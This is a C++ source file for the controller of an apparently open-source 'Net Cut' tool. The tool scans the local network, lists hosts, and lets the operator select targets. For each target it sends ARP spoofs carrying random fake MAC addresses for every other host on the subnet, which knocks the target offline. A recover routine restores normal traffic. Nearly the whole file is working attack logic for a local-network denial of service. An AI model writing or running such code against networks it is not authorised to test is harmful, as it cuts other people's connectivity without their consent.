#include "models/controller.hh"
#include "utils/color.hh"
#include "utils/mac_utils.hh"
#include "utils/socket_utils.hh"
#include "utils/string_utils.hh"
#include "utils/thread_utils.hh"

#include <algorithm>
#include <iostream>
#include <string>

Controller::Controller(const int attack_interval_ms) : attack_interval_ms_(attack_interval_ms) {}

void Controller::ScanTargets() {
  std::vector<Host> active_hosts = scanner_.ScanNetworks();
  for (const Host &active_host : active_hosts) {
    hosts_.insert(active_host);
  }
}

void Controller::ShowTargets() {
  ScanTargets();

  color::Modifier red(color::Code::FG_RED);
  color::Modifier green(color::Code::FG_GREEN);
  color::Modifier normal(color::Code::FG_DEFAULT);

  std::cout << "\n========================= Net Cut =========================\n";
  std::cout << "Select one or more targets by number, separated by space.\n";
  std::cout << "Or enter 'q' to quit, 'r' to refresh targets.\n";
  std::cout << green << "green: available targets, select to cut.\n";
  std::cout << red << "red: already cut targets, select to recover.\n" << normal << "\n";

  size_t counter = 1;
  for (const Host &host : hosts_) {
    std::cout << (host.IsCut() ? red : green) << (counter++) << ") " << host.GetIp() << " (" << host.GetMac() << ")\n"
              << normal;
  }

  std::cout << "\nTargets: ";
}

std::vector<size_t> Controller::GetTargets() {
  std::vector<size_t> indices;
  std::string input;
  std::getline(std::cin, input);
  std::string trimmed_input = string_utils::Trim(input);

  if (trimmed_input == "q") {
    RecoverAllHosts();  // being nice by recovering the network for targets before exiting
    socket_utils::CloseSockets();
    thread_utils::StopAllThreads();
    exit(EXIT_SUCCESS);
  } else if (trimmed_input == "r") {
    return std::vector<size_t>{};
  }

  std::vector<std::string> tokens = string_utils::Split(trimmed_input, " ");

  std::for_each(tokens.begin(), tokens.end(), [&](const std::string &str) {
    if (!str.empty() && std::all_of(str.begin(), str.end(), [](const char &chr) { return isdigit(chr); })) {
      indices.emplace_back(std::stoul(str));
    }
  });

  std::sort(indices.begin(), indices.end());

  return indices;
}

void Controller::Action(size_t index) {
  index--;
  if (index >= hosts_.size()) {
    return;
  }

  auto iter = hosts_.begin();
  std::advance(iter, index);

  if (iter->IsCut()) {
    Recover(*iter);
  } else {
    Attack(*iter);
  }
}

void Controller::Attack(const Host &target) {
  Interface interface = scanner_.GetInterfaceByIp(target.GetIp());
  for (const Host &host : hosts_) {
    if (host.GetIp() == target.GetIp() || !interface.IsSameSubnet(host.GetIp())) {
      continue;
    }

    if (arp_.find(target) == arp_.end()) {
      arp_[target] = ARP(interface);
    }

    if (fake_mac_address_.find(host) == fake_mac_address_.end()) {
      fake_mac_address_[host] = GetFakeMacAddress();
    }

    arp_[target].Spoof(target, host, attack_interval_ms_, fake_mac_address_[host]);
  }
  target.SetStatus(Status::CUT);
}

void Controller::Recover(const Host &target) {
  Interface interface = scanner_.GetInterfaceByIp(target.GetIp());
  for (const Host &host : hosts_) {
    if (host.GetIp() == target.GetIp() || !interface.IsSameSubnet(host.GetIp())) {
      continue;
    }
    arp_[target].Recover(target, host);
  }
  target.SetStatus(Status::NORMAL);
}

void Controller::RecoverAllHosts() {
  for (const Host &host : hosts_) {
    if (host.IsCut()) {
      Recover(host);
    }
  }
}

std::string Controller::GetFakeMacAddress() const { return mac_utils::GetRandomMacAddress(); }